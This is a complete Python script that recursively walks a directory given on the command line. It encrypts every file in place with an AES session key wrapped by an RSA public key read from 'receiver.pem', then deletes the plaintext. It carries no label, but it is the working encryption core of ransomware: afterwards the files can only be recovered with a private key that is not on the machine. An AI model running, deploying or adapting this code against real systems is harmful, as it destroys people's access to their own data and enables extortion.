import os
import sys
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

def encrypt_data(path,file_name,session_key,recipient_key):
    if(os.path.exists(path) == True and os.path.isfile(path+'/'+file_name) == True):
        # open the file that been encrypt
        rename_str = path+'/'+file_name+".temp"
        os.rename(path+'/'+file_name,rename_str)
        file_source = open(rename_str, "rb")
        file_out = open(path+'/'+file_name, "wb")
        data = file_source.read()
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        file_out.write(cipher_rsa.encrypt(session_key))

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        [ file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext) ]
        file_out.close()
        file_source.close()
        os.remove(rename_str)
        
def get_session_key():
    session_key = get_random_bytes(16)
    recipient_key = RSA.import_key(open("receiver.pem").read())
    return [session_key,recipient_key]

def start_encrypt(main_path):
    session_key,recipient_key = get_session_key()
    if(os.path.exists(main_path) and os.path.isdir(main_path)):
        for dirPath, dirNames, fileNames in os.walk(main_path):
            for f in fileNames:
                encrypt_data(dirPath,f,session_key,recipient_key)

def main():
    if(len(sys.argv) == 2):
        main_path = sys.argv[1]
        start_encrypt(main_path)
        return 0
    else:
        print("傳入參數有誤")
        return 1

if __name__ == "__main__":
    # execute only if run as a script
    main()